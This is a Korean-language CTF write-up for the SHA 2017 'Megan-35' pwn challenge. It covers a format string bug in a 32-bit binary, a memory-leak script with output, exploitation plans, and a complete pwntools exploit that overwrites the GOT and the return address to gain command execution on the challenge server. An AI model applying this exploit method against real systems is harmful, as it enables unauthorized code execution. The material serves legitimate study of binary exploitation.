# [2017_SHA] \[PWN] Megan-35

### 환경

```
[*] '/root/labs/ctf/2017_sha/Megan-35/megan-35'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

\+ 서버에는 ASLR이 걸려있지 않습니다.(아래에서 설명)



### 취약점 - Format String Bug

```c
int __cdecl main(int a1)
{
  const char *v1; // eax@1
  int v2; // edx@1
  char s; // [sp+0h] [bp-21Ch]@1
  char dest; // [sp+100h] [bp-11Ch]@1
  int v6; // [sp+200h] [bp-1Ch]@1
  int *v7; // [sp+214h] [bp-8h]@1

  v7 = &a1;
  v6 = *MK_FP(__GS__, 20);
  puts("Decrypt your text with the MEGAN-35 encryption.");
  fflush(stdout);
  fgets(&s, 255, stdin);
  v1 = (const char *)sub_804866B(&s, strlen(&s));
  strcpy(&dest, v1);
  printf(&dest);
  v2 = *MK_FP(__GS__, 20) ^ v6;
  return 0;
}
```

printf 하는 부분에서 FSB 취약점이 발생하는 것을 알 수 있습니다.

이 프로그램은 MEGAN-35라는 인코딩 방식으로 인코드된 문자열을 디코드하여 출력해주는 프로그램입니다. 취약한 포맷 스트링을 미리 MEGAN-35로 인코드해놓고 프로그램에 넣으면 FSB 취약점을 이용할 수 있습니다.(저는 검색도 안해보고 MEGAN-35가 커스텀 암호화 방식인줄 알았습니다…)



### 시나리오

시나리오를 짜기 전에 우선 서버의 환경을 알아와야합니다.

```python
from pwn import *
import subprocess, sys, os, base64

megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"

class B64weird_encodings:
 
    def __init__(self, translation):
        b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.srch = dict(zip(b, translation))
        self.revlsrch = dict(zip(translation, b))
 
    def encode(self, pt):
        global srch
        b64 = base64.b64encode(pt)
        r = "".join([self.srch[x] for x in b64])
        return r
 
    def decode(self, code):
        global revlsrch
        b64 = "".join([self.revlsrch[x] for x in code])
        r = base64.b64decode(b64)
        return r    
 
def encode(variant, pt):
    encoder = B64weird_encodings(variant)
    return encoder.encode(pt)
 
def decode(variant, code):
    try:
        encoder = B64weird_encodings(variant)
        return encoder.decode(code)
    except KeyError:
        return "Not valid"
    except TypeError:
        return "Padding iccorrect"

payload = "AAAA%145$x"
payload = encode(megan35, payload)
print payload
p = connect("megan35.stillhackinganyway.nl",3535)
p.recv()
p.sendline(payload)
p.interactive()
```

위 코드를 통해 오프셋 145인 메모리 주소를 반복하여 leak해봅시다.



```
root@inj3ct:~/labs/ctf/2017_sha/Megan-35# python leak.py 
beKGbcerSIe/o355
[+] Opening connection to megan35.stillhackinganyway.nl on port 3535: Done
[*] Switching to interactive mode
AAAAf7fc9000[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to megan35.stillhackinganyway.nl port 3535
root@inj3ct:~/labs/ctf/2017_sha/Megan-35# python leak.py 
beKGbcerSIe/o355
[+] Opening connection to megan35.stillhackinganyway.nl on port 3535: Done
[*] Switching to interactive mode
AAAAf7fc9000[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to megan35.stillhackinganyway.nl port 3535
root@inj3ct:~/labs/ctf/2017_sha/Megan-35# python leak.py 
beKGbcerSIe/o355
[+] Opening connection to megan35.stillhackinganyway.nl on port 3535: Done
[*] Switching to interactive mode
AAAAf7fc9000[*] Got EOF while reading in interactive
```

그 주소가 일정함을 알 수 있는데, 이를 통해 우리는 서버에 ASLR이 걸려있지 않다는걸 유추할 수 있습니다.

그럼 시나리오를 작성해봅시다.



#### 시나리오1

1. main 함수의 return address 주소가 적힌 스택 메모리의 주솟값을 알아낸다.
2. 메모리를 적절하게 읽어와서 libc base를 계산한다.
3. FSB를 이용해 main 함수의 ret를 main으로 overwrite한다.
4. strcpy를 system 함수의 주소로 overwrite한다.
5. 실행할 명령어를 Megan-35로 인코딩한 후, 입력한다.

#### 시나리오2

1. main 함수의 return address 주소가 적힌 스택 메모리의 주솟값을 알아낸다.
2. 메모리를 적절하게 읽어와서 libc base를 계산한다.
3. FSB를 이용해 main 함수의 ret를 main으로 overwrite한다.
4. strcpy를 one-shot gadget의 주소로 overwrite한다.

시나리오1이 로컬에선 정상적으로 작동했습니다. 하지만 어느 부분이 잘못된 것인지 리모트에선 제대로 작동하지 않았습니다.(libc base 잘못 찾아서 삽질하고, 리모트에서 제대로 되지 않아서 또 삽질했습니다ㅠㅠ 그러다가 one-shot 가젯 썼더니 작동하길래 허무했습니다…)

시나리오2를 이용하여 익스플로잇에 성공했습니다. (시나리오1의 경우, ex_local.py를 참고해주세요.)



### Exploit

```python
from pwn import *
import subprocess, sys, os, base64

megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"

class B64weird_encodings:
 
    def __init__(self, translation):
        b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.srch = dict(zip(b, translation))
        self.revlsrch = dict(zip(translation, b))
 
    def encode(self, pt):
        global srch
        b64 = base64.b64encode(pt)
        r = "".join([self.srch[x] for x in b64])
        return r
 
    def decode(self, code):
        global revlsrch
        b64 = "".join([self.revlsrch[x] for x in code])
        r = base64.b64decode(b64)
        return r    
 
def encode(variant, pt):
    encoder = B64weird_encodings(variant)
    return encoder.encode(pt)
 
def decode(variant, code):
    try:
        encoder = B64weird_encodings(variant)
        return encoder.decode(code)
    except KeyError:
        return "Not valid"
    except TypeError:
        return "Padding iccorrect"
 
e = ELF('libc.so.6')

libcbase = 0xf7e19000
system = libcbase + 0x5f065
strcpy_got = 0x0804A01C
main_ret = 0xffffd67c+0x750
main = 0x80484e0

payload = fmtstr_payload(71,{main_ret:main,strcpy_got:system},write_size='byte')+"bbbb"
payload.encode("hex")
payload = encode(megan35,payload)
print payload
p = connect("megan35.stillhackinganyway.nl",3535)
p.recv()
p.sendline(payload)

p.recvuntil("bbbb")
print p.recv()

cmd = raw_input("> ")[:-1]
cmd = encode(megan35,cmd)
p.sendline(cmd)
p.interactive()
```

